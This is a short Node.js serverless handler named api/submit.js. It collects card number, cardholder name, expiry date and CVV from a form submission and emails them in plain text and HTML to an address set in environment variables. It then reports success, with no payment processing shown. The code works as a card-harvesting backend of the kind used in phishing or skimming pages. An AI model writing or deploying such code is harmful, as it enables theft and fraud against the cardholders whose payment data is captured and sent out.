// api/submit.js
require('dotenv').config();
const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    const { cardNumber, cardName, expiryMonth, expiryYear, cvv } = req.body;

    // Set up the email transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail', // or any other email service
        auth: {
            user: process.env.EMAIL_USER, // use environment variable
            pass: process.env.EMAIL_PASS   // use environment variable
        }
    });

    // Set up the email data
    const mailOptions = {
        from: process.env.EMAIL_SENDER, // sender address
        to: process.env.EMAIL_USER,   // list of receivers
        subject: 'New Credit Card Submission', // Subject line
        text: `Card Number: ${cardNumber}\nCard Name: ${cardName}\nExpiry Date: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}`, // plain text body
        html: `<p>Card Number: ${cardNumber}</p><p>Card Name: ${cardName}</p><p>Expiry Date: ${expiryMonth}/${expiryYear}</p><p>CVV: ${cvv}</p>` // html body
    };

    // Send the email
    await new Promise((resolve, reject) => {
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return reject(error);
            }
            resolve(info);
        });
    });

    res.status(200).json({ success: true });
};
